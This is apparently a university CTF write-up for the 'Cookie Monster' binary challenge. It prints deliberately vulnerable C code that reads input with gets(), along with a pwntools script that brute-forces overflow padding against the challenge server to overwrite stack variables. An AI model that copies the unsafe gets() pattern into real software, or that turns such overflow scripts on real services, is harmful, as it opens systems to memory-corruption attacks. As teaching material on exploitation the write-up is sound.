---
title: "Tutor CTF: Cookie Monster"
description: (200 points) Binary Challenge
author: Kevin Zhu
public: true
uploadDate: 2022-04-08 23:15+11:00
lastModified: 2022-04-08 23:15+11:00
notes: ''
tags:
- capture the flag
- tutor ctf
- comp6841
menu:
  groups: []
  submenus: []
name: 31_tutorctf_cookie_monster
---

_Contest Source: [COMP6[84]41 CTF](https://www.comp6841.com/challenges)_

> _Note that all flags have been replaced with "COMP6841{REDACTED}". This is to discourage you from just blindly submitting the final answer, and to encourage you to follow along and learn something along the way._

## Exploration

We are given a netcat IP address and a exploitable buffer code. Let's look at it:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define BUFFER_SIZE 16
#define FLAG_SIZE 50
#define QUOTE_SIZE 4

char flag[FLAG_SIZE];
char quotes[QUOTE_SIZE][100] = {"NOT ENOUGH COOKIES", "I'M STILL HUNGRY", "MORE", "GRRR GIVE ME COOKIES"};

void oppsie(void) {
    char c1 = 1;
    char c2 = 1;
    char c3 = 1;
    char c4 = 1;
    char c5 = 1;
    char c6 = 1;
    char buffer[BUFFER_SIZE];
    gets(buffer);

    if (c1 == 'C' && c2 == 'O' && c3 == 'O' && c4 == 'K' && c5 == 'I' && c6 == 'E') {
        printf("%s\n", flag);
        fflush(stdout);
        exit(1);
    }
}

void cry(int counter) {
    printf("%s", quotes[counter % QUOTE_SIZE]);
    for (int i = counter*2; i > 0; i--) {
        printf("!");
    }
    printf("\n");
}

int main(int argc, char **argv){

    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        printf("Missing flag.txt\n");
        exit(0);
    }

    fgets(flag, FLAG_SIZE, f);

    printf("HI, I'M THE COOKIE MONSTER AND I LOVE COOKIES\n");

    int counter = 0;
    while (1) {
        printf("Feed the cookie monster: ");
        fflush(stdout);
        oppsie();
        if (counter > 0) {
            cry(counter);
        }
        counter++;
    }
    return 0;
}
```

So right off the bat, it looks like the `oppsie` function is going to be pretty important, since if we can somehow get the variables `c1` to `c6` equal to "COOKIE", then we can get the flag. Unfortunately, we have no way of changing them from their initial values, so it seems impossible.

However, we can exploit a buffer overflow in the `gets(buffer)` line. `gets` is insecure, and does not check the size of the buffer when scanning in. This means that if we enter a string that is longer than BUFFER_SIZE (16 in this case), we will start to overflow our buffer and overwrite values in the stack. Hence, we can enter something like "AAAAAAAAAAAAAAAAEIKOOC" (16 A's, followed by COOKIE in reverse because we overwrite the variables in reverse order) in order to overwrite the next variables on the stack, which of course happen to be `c6`, `c5`, `c4`, etc.

## Bruteforcing with Pwntools

Though in reality, it's not all that simple. Because of how compilers will align variable addresses, we're not guaranteed that we need exactly 16 A's. It can be a little bit more than that. Thus, it's useful to write a script that will try all sorts of different numbers of A. `pwntools` provides a really nice tool that allows us to quickly connect to such a netcat server and brute force all the different numbers until we find one that works. Here's a very crude implementation that crashes as soon as it finds the correct number of A's:

```python
from pwn import *

conn = remote("13.210.180.94", 10001)
for i in range(16, 30):
    conn.recvuntil(b'Feed the cookie monster: ')
    s = b'A'*i+b'EIKOOC\n'
    conn.send(s)
    print(i, s)

conn.close()
```

Running it, we get:

```sh
$ python3 get.py
16 b'AAAAAAAAAAAAAAAAEIKOOC\n'
17 b'AAAAAAAAAAAAAAAAAEIKOOC\n'
18 b'AAAAAAAAAAAAAAAAAAEIKOOC\n'
19 b'AAAAAAAAAAAAAAAAAAAEIKOOC\n'
20 b'AAAAAAAAAAAAAAAAAAAAEIKOOC\n'
21 b'AAAAAAAAAAAAAAAAAAAAAEIKOOC\n'
22 b'AAAAAAAAAAAAAAAAAAAAAAEIKOOC\n'
23 b'AAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n'
24 b'AAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n'
25 b'AAAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n'
26 b'AAAAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n'
Traceback (most recent call last):
  File "attack.py", line 5, in <module>
    conn.recvuntil(b'Feed the cookie monster: ')
  File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py", line 333, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py", line 105, in recv
    return self._recv(numb, timeout) or b''
  File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py", line 183, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py", line 154, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to 13.210.180.94 port 10001
```

Which tells us that 26 A's caused the program to exit without giving us another "Feed the cookie monster:" message. In other words, we've found the right number of A's to trigger the `oppsie` code! We can now manually enter in the correct string to get the flag, or alternately run pwntools in DEBUG mode so that it returns the final message before the program crashed.

```sh
$ python3 get.py DEBUG
```
